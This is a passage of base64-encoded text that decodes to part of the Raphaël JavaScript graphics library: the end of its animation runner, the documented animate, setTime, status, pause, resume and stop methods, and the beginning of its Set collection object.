4gICAgICAgICAgICAgICAgICAgIGVhc3llYXN5ID0gZnVuY3Rpb24gKHQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBDdWJpY0JlemllckF0VGltZSh0LCArY3VydmVbMV0sICtjdXJ2ZVsyXSwgK2N1cnZlWzNdLCArY3VydmVbNF0sIG1zKTtcbiAgICAgICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBlYXN5ZWFzeSA9IHBpcGU7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdGltZXN0YW1wID0gcGFyYW1zLnN0YXJ0IHx8IGFuaW0uc3RhcnQgfHwgK25ldyBEYXRlO1xuICAgICAgICAgICAgZSA9IHtcbiAgICAgICAgICAgICAgICBhbmltOiBhbmltLFxuICAgICAgICAgICAgICAgIHBlcmNlbnQ6IHBlcmNlbnQsXG4gICAgICAgICAgICAgICAgdGltZXN0YW1wOiB0aW1lc3RhbXAsXG4gICAgICAgICAgICAgICAgc3RhcnQ6IHRpbWVzdGFtcCArIChhbmltLmRlbCB8fCAwKSxcbiAgICAgICAgICAgICAgICBzdGF0dXM6IDAsXG4gICAgICAgICAgICAgICAgaW5pdHN0YXR1czogc3RhdHVzIHx8IDAsXG4gICAgICAgICAgICAgICAgc3RvcDogZmFsc2UsXG4gICAgICAgICAgICAgICAgbXM6IG1zLFxuICAgICAgICAgICAgICAgIGVhc2luZzogZWFzeWVhc3ksXG4gICAgICAgICAgICAgICAgZnJvbTogZnJvbSxcbiAgICAgICAgICAgICAgICBkaWZmOiBkaWZmLFxuICAgICAgICAgICAgICAgIHRvOiB0byxcbiAgICAgICAgICAgICAgICBlbDogZWxlbWVudCxcbiAgICAgICAgICAgICAgICBjYWxsYmFjazogcGFyYW1zLmNhbGxiYWNrLFxuICAgICAgICAgICAgICAgIHByZXY6IHByZXYsXG4gICAgICAgICAgICAgICAgbmV4dDogbmV4dCxcbiAgICAgICAgICAgICAgICByZXBlYXQ6IHRpbWVzIHx8IGFuaW0udGltZXMsXG4gICAgICAgICAgICAgICAgb3JpZ2luOiBlbGVtZW50LmF0dHIoKSxcbiAgICAgICAgICAgICAgICB0b3RhbE9yaWdpbjogdG90YWxPcmlnaW5cbiAgICAgICAgICAgIH07XG4gICAgICAgICAgICBhbmltYXRpb25FbGVtZW50cy5wdXNoKGUpO1xuICAgICAgICAgICAgaWYgKHN0YXR1cyAmJiAhaXNJbkFuaW0gJiYgIWlzSW5BbmltU2V0KSB7XG4gICAgICAgICAgICAgICAgZS5zdG9wID0gdHJ1ZTtcbiAgICAgICAgICAgICAgICBlLnN0YXJ0ID0gbmV3IERhdGUgLSBtcyAqIHN0YXR1cztcbiAgICAgICAgICAgICAgICBpZiAoYW5pbWF0aW9uRWxlbWVudHMubGVuZ3RoID09IDEpIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGFuaW1hdGlvbigpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmIChpc0luQW5pbVNldCkge1xuICAgICAgICAgICAgICAgIGUuc3RhcnQgPSBuZXcgRGF0ZSAtIGUubXMgKiBzdGF0dXM7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBhbmltYXRpb25FbGVtZW50cy5sZW5ndGggPT0gMSAmJiByZXF1ZXN0QW5pbUZyYW1lKGFuaW1hdGlvbik7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpc0luQW5pbS5pbml0c3RhdHVzID0gc3RhdHVzO1xuICAgICAgICAgICAgaXNJbkFuaW0uc3RhcnQgPSBuZXcgRGF0ZSAtIGlzSW5BbmltLm1zICogc3RhdHVzO1xuICAgICAgICB9XG4gICAgICAgIGV2ZShcInJhcGhhZWwuYW5pbS5zdGFydC5cIiArIGVsZW1lbnQuaWQsIGVsZW1lbnQsIGFuaW0pO1xuICAgIH1cbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5hbmltYXRpb25cbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIENyZWF0ZXMgYW4gYW5pbWF0aW9uIG9iamVjdCB0aGF0IGNhbiBiZSBwYXNzZWQgdG8gdGhlIEBFbGVtZW50LmFuaW1hdGUgb3IgQEVsZW1lbnQuYW5pbWF0ZVdpdGggbWV0aG9kcy5cbiAgICAgKiBTZWUgYWxzbyBAQW5pbWF0aW9uLmRlbGF5IGFuZCBAQW5pbWF0aW9uLnJlcGVhdCBtZXRob2RzLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBwYXJhbXMgKG9iamVjdCkgZmluYWwgYXR0cmlidXRlcyBmb3IgdGhlIGVsZW1lbnQsIHNlZSBhbHNvIEBFbGVtZW50LmF0dHJcbiAgICAgLSBtcyAobnVtYmVyKSBudW1iZXIgb2YgbWlsbGlzZWNvbmRzIGZvciBhbmltYXRpb24gdG8gcnVuXG4gICAgIC0gZWFzaW5nIChzdHJpbmcpICNvcHRpb25hbCBlYXNpbmcgdHlwZS4gQWNjZXB0IG9uZSBvZiBAUmFwaGFlbC5lYXNpbmdfZm9ybXVsYXMgb3IgQ1NTIGZvcm1hdDogYGN1YmljJiN4MjAxMDtiZXppZXIoWFgsJiMxNjA7WFgsJiMxNjA7WFgsJiMxNjA7WFgpYFxuICAgICAtIGNhbGxiYWNrIChmdW5jdGlvbikgI29wdGlvbmFsIGNhbGxiYWNrIGZ1bmN0aW9uLiBXaWxsIGJlIGNhbGxlZCBhdCB0aGUgZW5kIG9mIGFuaW1hdGlvbi5cbiAgICAgKipcbiAgICAgPSAob2JqZWN0KSBAQW5pbWF0aW9uXG4gICAgXFwqL1xuICAgIFIuYW5pbWF0aW9uID0gZnVuY3Rpb24gKHBhcmFtcywgbXMsIGVhc2luZywgY2FsbGJhY2spIHtcbiAgICAgICAgaWYgKHBhcmFtcyBpbnN0YW5jZW9mIEFuaW1hdGlvbikge1xuICAgICAgICAgICAgcmV0dXJuIHBhcmFtcztcbiAgICAgICAgfVxuICAgICAgICBpZiAoUi5pcyhlYXNpbmcsIFwiZnVuY3Rpb25cIikgfHwgIWVhc2luZykge1xuICAgICAgICAgICAgY2FsbGJhY2sgPSBjYWxsYmFjayB8fCBlYXNpbmcgfHwgbnVsbDtcbiAgICAgICAgICAgIGVhc2luZyA9IG51bGw7XG4gICAgICAgIH1cbiAgICAgICAgcGFyYW1zID0gT2JqZWN0KHBhcmFtcyk7XG4gICAgICAgIG1zID0gK21zIHx8IDA7XG4gICAgICAgIHZhciBwID0ge30sXG4gICAgICAgICAgICBqc29uLFxuICAgICAgICAgICAgYXR0cjtcbiAgICAgICAgZm9yIChhdHRyIGluIHBhcmFtcykgaWYgKHBhcmFtc1toYXNdKGF0dHIpICYmIHRvRmxvYXQoYXR0cikgIT0gYXR0ciAmJiB0b0Zsb2F0KGF0dHIpICsgXCIlXCIgIT0gYXR0cikge1xuICAgICAgICAgICAganNvbiA9IHRydWU7XG4gICAgICAgICAgICBwW2F0dHJdID0gcGFyYW1zW2F0dHJdO1xuICAgICAgICB9XG4gICAgICAgIGlmICghanNvbikge1xuICAgICAgICAgICAgLy8gaWYgcGVyY2VudC1saWtlIHN5bnRheCBpcyB1c2VkIGFuZCBlbmQtb2YtYWxsIGFuaW1hdGlvbiBjYWxsYmFjayB1c2VkXG4gICAgICAgICAgICBpZihjYWxsYmFjayl7XG4gICAgICAgICAgICAgICAgLy8gZmluZCB0aGUgbGFzdCBvbmVcbiAgICAgICAgICAgICAgICB2YXIgbGFzdEtleSA9IDA7XG4gICAgICAgICAgICAgICAgZm9yKHZhciBpIGluIHBhcmFtcyl7XG4gICAgICAgICAgICAgICAgICAgIHZhciBwZXJjZW50ID0gdG9JbnQoaSk7XG4gICAgICAgICAgICAgICAgICAgIGlmKHBhcmFtc1toYXNdKGkpICYmIHBlcmNlbnQgPiBsYXN0S2V5KXtcbiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RLZXkgPSBwZXJjZW50O1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGxhc3RLZXkgKz0gJyUnO1xuICAgICAgICAgICAgICAgIC8vIGlmIGFscmVhZHkgZGVmaW5lZCBjYWxsYmFjayBpbiB0aGUgbGFzdCBrZXlmcmFtZSwgc2tpcFxuICAgICAgICAgICAgICAgICFwYXJhbXNbbGFzdEtleV0uY2FsbGJhY2sgJiYgKHBhcmFtc1tsYXN0S2V5XS5jYWxsYmFjayA9IGNhbGxiYWNrKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICByZXR1cm4gbmV3IEFuaW1hdGlvbihwYXJhbXMsIG1zKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGVhc2luZyAmJiAocC5lYXNpbmcgPSBlYXNpbmcpO1xuICAgICAgICAgICAgY2FsbGJhY2sgJiYgKHAuY2FsbGJhY2sgPSBjYWxsYmFjayk7XG4gICAgICAgICAgICByZXR1cm4gbmV3IEFuaW1hdGlvbih7MTAwOiBwfSwgbXMpO1xuICAgICAgICB9XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5hbmltYXRlXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBDcmVhdGVzIGFuZCBzdGFydHMgYW5pbWF0aW9uIGZvciBnaXZlbiBlbGVtZW50LlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBwYXJhbXMgKG9iamVjdCkgZmluYWwgYXR0cmlidXRlcyBmb3IgdGhlIGVsZW1lbnQsIHNlZSBhbHNvIEBFbGVtZW50LmF0dHJcbiAgICAgLSBtcyAobnVtYmVyKSBudW1iZXIgb2YgbWlsbGlzZWNvbmRzIGZvciBhbmltYXRpb24gdG8gcnVuXG4gICAgIC0gZWFzaW5nIChzdHJpbmcpICNvcHRpb25hbCBlYXNpbmcgdHlwZS4gQWNjZXB0IG9uZSBvZiBAUmFwaGFlbC5lYXNpbmdfZm9ybXVsYXMgb3IgQ1NTIGZvcm1hdDogYGN1YmljJiN4MjAxMDtiZXppZXIoWFgsJiMxNjA7WFgsJiMxNjA7WFgsJiMxNjA7WFgpYFxuICAgICAtIGNhbGxiYWNrIChmdW5jdGlvbikgI29wdGlvbmFsIGNhbGxiYWNrIGZ1bmN0aW9uLiBXaWxsIGJlIGNhbGxlZCBhdCB0aGUgZW5kIG9mIGFuaW1hdGlvbi5cbiAgICAgKiBvclxuICAgICAtIGFuaW1hdGlvbiAob2JqZWN0KSBhbmltYXRpb24gb2JqZWN0LCBzZWUgQFJhcGhhZWwuYW5pbWF0aW9uXG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgb3JpZ2luYWwgZWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLmFuaW1hdGUgPSBmdW5jdGlvbiAocGFyYW1zLCBtcywgZWFzaW5nLCBjYWxsYmFjaykge1xuICAgICAgICB2YXIgZWxlbWVudCA9IHRoaXM7XG4gICAgICAgIGlmIChlbGVtZW50LnJlbW92ZWQpIHtcbiAgICAgICAgICAgIGNhbGxiYWNrICYmIGNhbGxiYWNrLmNhbGwoZWxlbWVudCk7XG4gICAgICAgICAgICByZXR1cm4gZWxlbWVudDtcbiAgICAgICAgfVxuICAgICAgICB2YXIgYW5pbSA9IHBhcmFtcyBpbnN0YW5jZW9mIEFuaW1hdGlvbiA/IHBhcmFtcyA6IFIuYW5pbWF0aW9uKHBhcmFtcywgbXMsIGVhc2luZywgY2FsbGJhY2spO1xuICAgICAgICBydW5BbmltYXRpb24oYW5pbSwgZWxlbWVudCwgYW5pbS5wZXJjZW50c1swXSwgbnVsbCwgZWxlbWVudC5hdHRyKCkpO1xuICAgICAgICByZXR1cm4gZWxlbWVudDtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnNldFRpbWVcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFNldHMgdGhlIHN0YXR1cyBvZiBhbmltYXRpb24gb2YgdGhlIGVsZW1lbnQgaW4gbWlsbGlzZWNvbmRzLiBTaW1pbGFyIHRvIEBFbGVtZW50LnN0YXR1cyBtZXRob2QuXG4gICAgICoqXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIGFuaW0gKG9iamVjdCkgYW5pbWF0aW9uIG9iamVjdFxuICAgICAtIHZhbHVlIChudW1iZXIpIG51bWJlciBvZiBtaWxsaXNlY29uZHMgZnJvbSB0aGUgYmVnaW5uaW5nIG9mIHRoZSBhbmltYXRpb25cbiAgICAgKipcbiAgICAgPSAob2JqZWN0KSBvcmlnaW5hbCBlbGVtZW50IGlmIGB2YWx1ZWAgaXMgc3BlY2lmaWVkXG4gICAgICogTm90ZSwgdGhhdCBkdXJpbmcgYW5pbWF0aW9uIGZvbGxvd2luZyBldmVudHMgYXJlIHRyaWdnZXJlZDpcbiAgICAgKlxuICAgICAqIE9uIGVhY2ggYW5pbWF0aW9uIGZyYW1lIGV2ZW50IGBhbmltLmZyYW1lLjxpZD5gLCBvbiBzdGFydCBgYW5pbS5zdGFydC48aWQ+YCBhbmQgb24gZW5kIGBhbmltLmZpbmlzaC48aWQ+YC5cbiAgICBcXCovXG4gICAgZWxwcm90by5zZXRUaW1lID0gZnVuY3Rpb24gKGFuaW0sIHZhbHVlKSB7XG4gICAgICAgIGlmIChhbmltICYmIHZhbHVlICE9IG51bGwpIHtcbiAgICAgICAgICAgIHRoaXMuc3RhdHVzKGFuaW0sIG1taW4odmFsdWUsIGFuaW0ubXMpIC8gYW5pbS5tcyk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5zdGF0dXNcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEdldHMgb3Igc2V0cyB0aGUgc3RhdHVzIG9mIGFuaW1hdGlvbiBvZiB0aGUgZWxlbWVudC5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gYW5pbSAob2JqZWN0KSAjb3B0aW9uYWwgYW5pbWF0aW9uIG9iamVjdFxuICAgICAtIHZhbHVlIChudW1iZXIpICNvcHRpb25hbCAwIOKAkyAxLiBJZiBzcGVjaWZpZWQsIG1ldGhvZCB3b3JrcyBsaWtlIGEgc2V0dGVyIGFuZCBzZXRzIHRoZSBzdGF0dXMgb2YgYSBnaXZlbiBhbmltYXRpb24gdG8gdGhlIHZhbHVlLiBUaGlzIHdpbGwgY2F1c2UgYW5pbWF0aW9uIHRvIGp1bXAgdG8gdGhlIGdpdmVuIHBvc2l0aW9uLlxuICAgICAqKlxuICAgICA9IChudW1iZXIpIHN0YXR1c1xuICAgICAqIG9yXG4gICAgID0gKGFycmF5KSBzdGF0dXMgaWYgYGFuaW1gIGlzIG5vdCBzcGVjaWZpZWQuIEFycmF5IG9mIG9iamVjdHMgaW4gZm9ybWF0OlxuICAgICBvIHtcbiAgICAgbyAgICAgYW5pbTogKG9iamVjdCkgYW5pbWF0aW9uIG9iamVjdFxuICAgICBvICAgICBzdGF0dXM6IChudW1iZXIpIHN0YXR1c1xuICAgICBvIH1cbiAgICAgKiBvclxuICAgICA9IChvYmplY3QpIG9yaWdpbmFsIGVsZW1lbnQgaWYgYHZhbHVlYCBpcyBzcGVjaWZpZWRcbiAgICBcXCovXG4gICAgZWxwcm90by5zdGF0dXMgPSBmdW5jdGlvbiAoYW5pbSwgdmFsdWUpIHtcbiAgICAgICAgdmFyIG91dCA9IFtdLFxuICAgICAgICAgICAgaSA9IDAsXG4gICAgICAgICAgICBsZW4sXG4gICAgICAgICAgICBlO1xuICAgICAgICBpZiAodmFsdWUgIT0gbnVsbCkge1xuICAgICAgICAgICAgcnVuQW5pbWF0aW9uKGFuaW0sIHRoaXMsIC0xLCBtbWluKHZhbHVlLCAxKSk7XG4gICAgICAgICAgICByZXR1cm4gdGhpcztcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGxlbiA9IGFuaW1hdGlvbkVsZW1lbnRzLmxlbmd0aDtcbiAgICAgICAgICAgIGZvciAoOyBpIDwgbGVuOyBpKyspIHtcbiAgICAgICAgICAgICAgICBlID0gYW5pbWF0aW9uRWxlbWVudHNbaV07XG4gICAgICAgICAgICAgICAgaWYgKGUuZWwuaWQgPT0gdGhpcy5pZCAmJiAoIWFuaW0gfHwgZS5hbmltID09IGFuaW0pKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChhbmltKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZS5zdGF0dXM7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgb3V0LnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgYW5pbTogZS5hbmltLFxuICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzOiBlLnN0YXR1c1xuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAoYW5pbSkge1xuICAgICAgICAgICAgICAgIHJldHVybiAwO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuIG91dDtcbiAgICAgICAgfVxuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQucGF1c2VcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFN0b3BzIGFuaW1hdGlvbiBvZiB0aGUgZWxlbWVudCB3aXRoIGFiaWxpdHkgdG8gcmVzdW1lIGl0IGxhdGVyIG9uLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBhbmltIChvYmplY3QpICNvcHRpb25hbCBhbmltYXRpb24gb2JqZWN0XG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgb3JpZ2luYWwgZWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnBhdXNlID0gZnVuY3Rpb24gKGFuaW0pIHtcbiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhbmltYXRpb25FbGVtZW50cy5sZW5ndGg7IGkrKykgaWYgKGFuaW1hdGlvbkVsZW1lbnRzW2ldLmVsLmlkID09IHRoaXMuaWQgJiYgKCFhbmltIHx8IGFuaW1hdGlvbkVsZW1lbnRzW2ldLmFuaW0gPT0gYW5pbSkpIHtcbiAgICAgICAgICAgIGlmIChldmUoXCJyYXBoYWVsLmFuaW0ucGF1c2UuXCIgKyB0aGlzLmlkLCB0aGlzLCBhbmltYXRpb25FbGVtZW50c1tpXS5hbmltKSAhPT0gZmFsc2UpIHtcbiAgICAgICAgICAgICAgICBhbmltYXRpb25FbGVtZW50c1tpXS5wYXVzZWQgPSB0cnVlO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQucmVzdW1lXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXN1bWVzIGFuaW1hdGlvbiBpZiBpdCB3YXMgcGF1c2VkIHdpdGggQEVsZW1lbnQucGF1c2UgbWV0aG9kLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBhbmltIChvYmplY3QpICNvcHRpb25hbCBhbmltYXRpb24gb2JqZWN0XG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgb3JpZ2luYWwgZWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnJlc3VtZSA9IGZ1bmN0aW9uIChhbmltKSB7XG4gICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYW5pbWF0aW9uRWxlbWVudHMubGVuZ3RoOyBpKyspIGlmIChhbmltYXRpb25FbGVtZW50c1tpXS5lbC5pZCA9PSB0aGlzLmlkICYmICghYW5pbSB8fCBhbmltYXRpb25FbGVtZW50c1tpXS5hbmltID09IGFuaW0pKSB7XG4gICAgICAgICAgICB2YXIgZSA9IGFuaW1hdGlvbkVsZW1lbnRzW2ldO1xuICAgICAgICAgICAgaWYgKGV2ZShcInJhcGhhZWwuYW5pbS5yZXN1bWUuXCIgKyB0aGlzLmlkLCB0aGlzLCBlLmFuaW0pICE9PSBmYWxzZSkge1xuICAgICAgICAgICAgICAgIGRlbGV0ZSBlLnBhdXNlZDtcbiAgICAgICAgICAgICAgICB0aGlzLnN0YXR1cyhlLmFuaW0sIGUuc3RhdHVzKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gdGhpcztcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnN0b3BcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFN0b3BzIGFuaW1hdGlvbiBvZiB0aGUgZWxlbWVudC5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gYW5pbSAob2JqZWN0KSAjb3B0aW9uYWwgYW5pbWF0aW9uIG9iamVjdFxuICAgICAqKlxuICAgICA9IChvYmplY3QpIG9yaWdpbmFsIGVsZW1lbnRcbiAgICBcXCovXG4gICAgZWxwcm90by5zdG9wID0gZnVuY3Rpb24gKGFuaW0pIHtcbiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhbmltYXRpb25FbGVtZW50cy5sZW5ndGg7IGkrKykgaWYgKGFuaW1hdGlvbkVsZW1lbnRzW2ldLmVsLmlkID09IHRoaXMuaWQgJiYgKCFhbmltIHx8IGFuaW1hdGlvbkVsZW1lbnRzW2ldLmFuaW0gPT0gYW5pbSkpIHtcbiAgICAgICAgICAgIGlmIChldmUoXCJyYXBoYWVsLmFuaW0uc3RvcC5cIiArIHRoaXMuaWQsIHRoaXMsIGFuaW1hdGlvbkVsZW1lbnRzW2ldLmFuaW0pICE9PSBmYWxzZSkge1xuICAgICAgICAgICAgICAgIGFuaW1hdGlvbkVsZW1lbnRzLnNwbGljZShpLS0sIDEpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgZnVuY3Rpb24gc3RvcEFuaW1hdGlvbihwYXBlcikge1xuICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFuaW1hdGlvbkVsZW1lbnRzLmxlbmd0aDsgaSsrKSBpZiAoYW5pbWF0aW9uRWxlbWVudHNbaV0uZWwucGFwZXIgPT0gcGFwZXIpIHtcbiAgICAgICAgICAgIGFuaW1hdGlvbkVsZW1lbnRzLnNwbGljZShpLS0sIDEpO1xuICAgICAgICB9XG4gICAgfVxuICAgIGV2ZS5vbihcInJhcGhhZWwucmVtb3ZlXCIsIHN0b3BBbmltYXRpb24pO1xuICAgIGV2ZS5vbihcInJhcGhhZWwuY2xlYXJcIiwgc3RvcEFuaW1hdGlvbik7XG4gICAgZWxwcm90by50b1N0cmluZyA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgcmV0dXJuIFwiUmFwaGFcXHhlYmxcXHUyMDE5cyBvYmplY3RcIjtcbiAgICB9O1xuXG4gICAgLy8gU2V0XG4gICAgdmFyIFNldCA9IGZ1bmN0aW9uIChpdGVtcykge1xuICAgICAgICB0aGlzLml0ZW1zID0gW107XG4gICAgICAgIHRoaXMubGVuZ3RoID0gMDtcbiAgICAgICAgdGhpcy50eXBlID0gXCJzZXRcIjtcbiAgICAgICAgaWYgKGl0ZW1zKSB7XG4gICAgICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSBpdGVtcy5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICAgICAgaWYgKGl0ZW1zW2ldICYmIChpdGVtc1tpXS5jb25zdHJ1Y3RvciA9PSBlbHByb3RvLmNvbnN0cnVjdG9yIHx8IGl0ZW1zW2ldLmNvbnN0cnVjdG9yID09IFNldCkpIHtcbiAgICAgICAgICAgICAgICAgICAgdGhpc1t0aGlzLml0ZW1zLmxlbmd0aF0gPSB0aGlzLml0ZW1zW3RoaXMuaXRlbXMubGVuZ3RoXSA9IGl0ZW1zW2ldO1xuICAgICAgICAgICAgICAgICAgICB0aGlzLmxlbmd0aCsrO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgIH0sXG4gICAgc2V0cHJvdG8gPSBTZXQucHJvdG90eXBlO1xuICAgIC8qXFxcbiAgICAgKiBTZXQucHVzaFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQWRkcyBlYWNoIGFyZ3VtZW50IHRvIHRoZSBjdXJyZW50IHNldC5cbiAgICAgPSAob2JqZWN0KSBvcmlnaW5hbCBlbGVtZW50XG4gICAgXFwqL1xuICAgIHNldHByb3RvLnB1c2ggPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHZhciBpdGVtLFxuICAgICAgICAgICAgbGVuO1xuICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSBhcmd1bWVudHMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgaXRlbSA9IGFyZ3VtZW50c1tpXTtcbiAgICAgICAgICAgIGlmIChpdGVtICYmIChpdGVtLmNvbnN0cnVjdG9yID09IGVscHJvdG8uY29uc3RydWN0b3IgfHwgaXRlbS5jb25zdHJ1Y3RvciA9PSBTZXQpKSB7XG4gICAgICAgICAgICAgICAgbGVuID0gdGhpcy5pdGVtcy5sZW5ndGg7XG4gICAgICAgICAgICAgICAgdGhpc1tsZW5dID0gdGhpcy5pdGVtc1tsZW5dID0gaXRlbTtcbiAgICAgICAgICAgICAgICB0aGlzLmxlbmd0aCsrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFNldC5wb3BcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJlbW92ZXMgbGFzdCBlbGVtZW50IGFuZCByZXR1cm5zIGl0LlxuICAgICA9IChvYmplY3QpIGVsZW1lbnRcbiAgICBcXCovXG4gICAgc2V0cHJvdG8ucG9wID0gZnVuY3Rpb24gKCkge1xuICAgICAgICB0aGlzLmxlbmd0aCAmJiBkZWxldGUgdGhpc1t0aGlzLmxlbmd0aC0tXTtcbiAgICAgICAgcmV0dXJuIHRoaXMuaXRlbXMucG9wKCk7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogU2V0LmZvckVhY2hcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEV4ZWN1dGVzIGdpdmVuIGZ1bmN0aW9uIGZvciBlYWNoIGVsZW1lbnQgaW4gdGhlIHNldC5cbiAgICAgKlxuICAgICAqIElmIGZ1bmN0aW9uIHJldHVybnMgYGZhbHNlYCBpdCB3aWxsIHN0b3AgbG9vcCBydW5uaW5nLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBjYWxsYmFjayAoZnVuY3Rpb24pIGZ1bmN0aW9uIHRvIHJ1blxuICAgICAtIHRoaXNBcmcgKG9iamVjdCkgY29udGV4dCBvYmplY3QgZm9yIHRoZSBjYWxsYmFja1xuICAgICA9IChvYmplY3QpIFNldCBvYmplY3RcbiAgICBcXCovXG4gICAgc2V0cHJvdG8uZm9yRWFjaCA9IGZ1bmN0aW9uIChjYWxsYmFjaywgdGhpc0FyZykge1xuICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSB0aGlzLml0ZW1zLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgIGlmIChjYWxsYmFjay5jYWxsKHRoaXNBcmcsIHRoaXMuaXRlbXNbaV0sIGkpID09PSBmYWxzZSkge1xuICAgICAgICAgICAgICAgIHJldHVybiB0aGlzO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgZm9yICh2YXIgbWV0aG9kIGluIGVscHJvdG8pIGlmIChlbHByb3RvW2hhc10obWV0aG9kKSkge1xuICAgICAgICBzZXRwcm90b1ttZXRob2RdID0gKGZ1bmN0aW9uIChtZXRob2RuYW1lKSB7XG4gICAgICAgICAgICByZXR1cm4gZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgIHZhciBhcmcgPSBhcmd1bWVudHM7XG4gICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMuZm9yRWFjaChmdW5jdGlvbiAoZWwpIHtcbiAgICAgICAgICAgICAgICAgICAgZWxbbWV0aG9kbmFtZV1bYXBwbHldKGVsLCBhcmcpO1xuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgfTtcbiAgICAgICAgfSkobWV0aG9kKTtcbiAgICB9XG4gICAgc2V0cHJvdG8uYXR0ciA9IGZ1bmN0aW9uIChuYW1lLCB2YWx1ZSkge1xuICAgICAgICBpZiAobmFtZSAmJiBSLmlzKG5hbWUsIGFycmF5KSAmJiBSLmlzKG5hbWVbMF0sIFwib2JqZWN0XCIpKSB7XG4gICAgICAgICAgICBmb3IgKHZhciBqID0gMCwgamogPSBuYW1lLmxlbmd0aDsgaiA8IGpqOyBqKyspIHtcbiAgICAgICAgICAgICAgICB0aGlzLml0ZW1zW2pdLmF0dHIobmFtZVtqXSk7XG4gI